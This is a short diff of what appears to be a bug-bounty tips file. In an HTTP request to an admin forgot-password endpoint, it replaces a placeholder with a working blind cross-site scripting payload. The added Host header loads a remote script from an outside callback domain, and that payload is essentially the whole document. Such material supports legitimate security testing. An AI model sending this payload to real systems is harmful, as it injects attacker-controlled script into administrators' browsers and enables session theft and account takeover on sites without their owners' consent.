@@ -10,6 +10,6 @@
 ## @hunter0x7
 ```
 POST /admin/forgot_password HTTP/1.1
-Host: web..com&quot;&gt;&lt;img src=&quot;Blind XSS Here&quot;&gt;
+Host: web..com"><script src=https://zasptiko.xss.ht></script>
 ```
 
